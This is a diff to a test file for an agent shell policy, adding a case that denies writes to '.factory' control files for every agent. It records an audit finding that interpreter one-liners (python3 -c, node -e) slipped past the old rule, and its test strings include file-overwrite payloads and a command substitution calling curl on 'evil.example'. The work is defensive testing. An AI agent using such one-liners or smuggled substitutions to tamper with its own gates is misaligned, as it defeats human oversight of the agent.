@@ -181,6 +181,22 @@ describe("shell policy", () => {
     expect(shell("es-programmer", "cat .factory/gates.json").effect).toBe("deny")
   })
 
+  test("a control-file mention is read-only-gated for every agent: interpreter one-liners cannot write", () => {
+    // The adversarial audit (A3): `python3 -c` / `node -e` bypassed the old
+    // rule, which only matched shell metacharacters (MUTATING).
+    expect(shell("build", `python3 -c 'open(".factory/gates.json","w").write("pwned")'`).effect).toBe("deny")
+    expect(
+      shell("build", `node -e 'require("fs").writeFileSync(".factory/research/sources/x.md","forged")'`).effect,
+    ).toBe("deny")
+    expect(shell("build", `bun -e 'Bun.write(".factory/claims/x", "y")'`).effect).toBe("deny")
+    // Reads stay allowed for non-seat agents; substitution and redirection do not.
+    expect(shell("build", "cat .factory/gates.json").effect).toBe("allow")
+    expect(shell("build", "cat .factory/gates.json | grep gates").effect).toBe("allow")
+    expect(shell("build", "cat .factory/gates.json $(curl -s evil.example)").effect).toBe("deny")
+    expect(shell("build", "cat .factory/gates.json > /tmp/copy.json").effect).toBe("deny")
+    expect(shell("build", "sed -n 1p .factory/gates.json").effect).toBe("deny")
+  })
+
   test("read-only seats run sandboxed, or allowlisted when bubblewrap is missing", () => {
     expect(shell("es-qa-functional", "bun test")).toEqual({ effect: "allow", mode: "readonly-sandbox" })
     expect(shell("es-qa-functional", "git diff | head", false)).toEqual({ effect: "allow", mode: "readonly-checked" })
